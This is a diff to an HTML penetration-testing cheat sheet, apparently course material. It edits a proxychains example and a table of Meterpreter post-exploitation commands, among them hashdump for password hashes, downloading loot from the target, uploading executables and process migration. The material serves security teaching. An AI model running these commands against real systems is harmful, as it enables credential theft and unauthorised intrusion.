@@ -374,7 +374,7 @@ setg Proxies socks5:127.0.0.1:9050</div>
               <div class="step-num">1</div>
               <div class="step-body">
                 <div class="step-text">Prefix any command run from your attack platform to mask your true IP and potentially bypass restrictive firewalls:</div>
-                <div class="step-cmd">proxychains nmap -sT -Pn &lt;target&gt;</div>
+                <div class="step-cmd">proxychains &lt;command&gt; &lt;target&gt;</div>
               </div>
             </div>
           </div>
@@ -572,13 +572,15 @@ setg Proxies socks5:127.0.0.1:9050</div>
       <div class="cmd-block">
         <div class="cmd-block-header hdr-red"><span class="icon">👾</span>Meterpreter commands</div>
         <table class="cmd-table">
-          <tr><td class="c1">sysinfo</td><td class="c2">Target system name + OS architecture</td><td class="c3">sysinfo</td></tr>
-          <tr><td class="c1">getuid</td><td class="c2">Current session's user ID</td><td class="c3">getuid</td></tr>
-          <tr><td class="c1">hashdump</td><td class="c2">Dump password hashes</td><td class="c3">hashdump</td></tr>
-          <tr><td class="c1">execute -f &lt;cmd&gt;</td><td class="c2">Run a command/executable on target</td><td class="c3">execute -f calc.exe</td></tr>
-          <tr><td class="c1">download</td><td class="c2">Pull a file from target</td><td class="c3">download C:\loot.txt ./loot.txt</td></tr>
-          <tr><td class="c1">upload</td><td class="c2">Push a file to target (e.g. scanline)</td><td class="c3">upload sl.exe C:\Windows\Temp\</td></tr>
-          <tr><td class="c1">search</td><td class="c2">Search for a file (can also limit yourself to a specific directory)</td><td class="c3">search -d "C:\\Documents and Settings\\student\\" -f "*.jpg*"</td></tr>
+          <tr><td class="c1">sysinfo</td><td class="c2">Target system name + OS architecture</td><td class="c3">meterpreter &gt; sysinfo</td></tr>
+          <tr><td class="c1">getuid</td><td class="c2">Current session's user ID</td><td class="c3">meterpreter &gt; getuid</td></tr>
+          <tr><td class="c1">hashdump</td><td class="c2">Dump password hashes</td><td class="c3">meterpreter &gt; hashdump</td></tr>
+          <tr><td class="c1">execute -f &lt;cmd&gt;</td><td class="c2">Run a command/executable on target</td><td class="c3">meterpreter &gt; execute -f calc.exe</td></tr>
+          <tr><td class="c1">download</td><td class="c2">Pull a file from target</td><td class="c3"> meterpreter &gt; download C:\loot.txt ./loot.txt</td></tr>
+          <tr><td class="c1">upload</td><td class="c2">Push a file to target (e.g. scanline)</td><td class="c3"> meterpreter &gt; upload sl.exe C:\Windows\Temp\</td></tr>
+          <tr><td class="c1">search</td><td class="c2">Search for a file (can also limit yourself to a specific directory)</td><td class="c3">meterpreter &gt; search -d "C:\\Documents and Settings\\student\\" -f "*.jpg*"</td></tr>
+          <tr><td class="c1">migrate</td><td class="c2">Move your active payload from the initial compromised process into a different running process on the target system</td><td class="c3">meterpreter &gt; migrate &lt;PID&gt;  </td></tr>
+
         </table>
       </div>
 
